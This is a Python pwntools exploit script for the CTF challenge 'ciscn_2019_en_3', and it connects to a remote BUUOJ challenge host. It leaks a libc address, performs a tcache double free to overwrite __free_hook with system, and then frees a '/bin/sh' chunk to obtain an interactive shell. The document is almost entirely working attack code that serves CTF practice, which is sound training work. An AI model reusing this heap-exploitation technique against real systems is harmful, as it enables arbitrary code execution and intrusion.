# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
binary = './ciscn_2019_en_3'
elf = ELF('./ciscn_2019_en_3')
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28760'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla(':',num)

def add(size,content):
    cmd(1)
    sla(':',size)
    sa(':',content)

def delete(id):
    cmd(4)
    sla(':',id)


#gdb.attach(p,"b puts")

sla(" name?","niya")
sla(" ID.","aaaaaaaa")

leak = l64() - 231
libc.address = leak - libc.sym["setbuffer"]
system = libc.sym["system"]
free_hook = libc.sym["__free_hook"]

add(0x80,11)
add(0x50,"/bin/sh\x00")
delete(0)
delete(0)

add(0x80,p64(free_hook))
add(0x80,0)
add(0x80,p64(system))

delete(1)

#dbg()

p.interactive()

'''
@File    :   ciscn_2019_en_3.py
@Time    :   2021/07/14 15:12:00
@Author  :   Niyah 
'''
